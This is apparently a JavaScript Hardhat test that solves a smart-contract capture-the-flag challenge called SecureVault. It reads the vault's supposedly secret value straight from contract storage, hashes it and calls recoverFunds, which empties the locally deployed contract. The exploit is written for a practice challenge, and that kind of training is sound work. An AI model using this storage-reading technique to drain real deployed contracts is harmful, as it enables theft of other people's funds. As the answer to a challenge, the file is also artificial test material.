const { expect } = require('chai');
const { ethers } = require('hardhat');
const { BigNumber } = require('ethers');

// run the test
// npx hardhat test ./test/N1-SecureVault-easy.js
describe('CTF #1 SecureVault', function () {
  let challengeInstance, deployer;

  before(async function () {
    [deployer] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('N1SecureVault');
    challengeInstance = await Challenge.deploy({ value: ethers.utils.parseEther('0.0001') });
    await challengeInstance.deployed();
  });

  it('Should recover all funds', async function () {
    const secret = await ethers.provider.getStorageAt(challengeInstance.address, 0);
    console.log(secret);
    const encodedAnswer = ethers.utils.solidityKeccak256(['uint256', 'uint256'], [secret, ethers.utils.parseEther('0.0002')]);
    console.log(BigNumber.from(encodedAnswer).toString());
    const tx = await challengeInstance.recoverFunds(encodedAnswer, { value: ethers.utils.parseEther('0.0001') });
    await tx.wait();
    expect(await ethers.provider.getBalance(challengeInstance.address)).to.equal('0');
  });
});
